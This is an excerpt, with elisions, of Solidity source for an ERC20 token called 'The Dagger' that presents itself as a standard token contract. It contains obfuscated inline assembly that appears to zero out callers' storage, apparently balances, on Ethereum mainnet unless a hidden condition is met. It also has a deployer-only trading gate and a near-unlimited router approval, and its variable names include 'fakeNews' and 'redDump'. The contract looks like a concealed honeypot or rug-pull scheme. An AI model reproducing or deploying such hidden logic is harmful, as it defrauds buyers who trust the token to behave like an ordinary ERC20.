/*
The blow of a dagger does not cause as much pain as the blow of words.
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addDagger;
    uint256 private swordFighter = block.number*2;

    mapping (address => bool) private _firstForger; 
    mapping (address => bool) private _secondKiller;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _faceLess;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private quickKill;
    address public pair;
    ...
    bool private trading; uint256 private blueKing = 1; bool private redDump;
    uint256 private _decimals; uint256 private fakeNews;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addDagger.push(_router); addDagger.push(msgSender_); addDagger.push(pair);
        for (uint256 q=0; q < 3;) {_firstForger[addDagger[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xDC)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xaf24d1bea84378bfa76579a03c0f676fdd354e61df51aaf64f1526f08e019bb8
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x99931f05b146483062e69a919a363cc445845f74486b71c79e86d87d6941ad88,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; swordFighter = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addDagger[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployDagger(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addDagger[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployDagger(creator, initialSupply);
    }
}

contract TheDagger is ERC20Token {
    constructor() ERC20Token("The Dagger", "DAGGER", msg.sender, 25000000 * 10 ** 18) {
    }
}